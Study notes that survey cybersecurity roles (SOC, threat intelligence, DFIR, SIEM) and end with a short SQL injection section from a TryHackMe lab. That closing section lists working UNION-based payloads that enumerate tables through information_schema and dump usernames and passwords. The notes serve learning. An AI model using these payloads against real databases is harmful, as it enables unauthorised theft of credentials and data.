# Notes

* Offence / Read team
* Defense / Blue team
  * Prevent attacks
    * User cybersecurity awareness: for instance, sending a mail with a "malicious" link to your salaries, to test their vigilance?
    * Documenting: devices, network...
    * Updating: ensure everything is patched against know vulnerabilities=weakness
    * preventative security devices: firewall (what can enter/exit) and intrusion prevention systems (IPS, sort of antivirus for the network)
    * proper logging, and monitoring, to ensure we know key events (new device...)

* Security Operations Center (SOC): a team
  * Detect weakness, and ensure that a patch is applied
  * Detect policy violations
  * Detect unusual activity (employees...)
  * Detect intrusions
* Threat Intelligence
  * Information about actual and potential enemies
  * "threat-informed defense"
  * the goal is to create a list of recommendations/steps
* Digital Forensics and Incident Response (DFIR)
  * Forensics: FileSystem / Memory / System&Network Logs
  * Incident responder determine how the cyberattack is handled (Preparation, Detection and Analysis, Containment, Eradication, and Recovery, Post-Incident Activity NIST!!!!!)
* Malware Analysis
  * Static (read the code)
  * Dynamic
* security analyst
  * Security Information and Event Management (SIEM) system. A SIEM gathers security-related information and events from various sources and presents them via one system
  * For instance, you would be notified if there is a failed login attempt or a login attempt from an unexpected geographic location. Moreover, with the advent of machine learning, a SIEM might detect unusual behavior, such as a user logging in at 3 AM when he usually logs in only during work hours.
  * Block IP (remediation)
* There are websites on the Internet that allow you to check the reputation of an IP address to see whether it's malicious or suspicious.
  * AbuseIPDB
  * Cisco Talos Intelligence

>  cyber attack include an attacker making our network or systems inaccessible, defacing (changing) the public website,

<hr class="sep-both">

## SQLi

* https://tryhackme.com/room/sqlinjectionlm
* UNION: same type too!
* `'` to discover if an attack is possible
* `';-- -`
* `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`: `article,staff_users`
* The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 
* `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`
* `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
* In-Band (error+union): same channel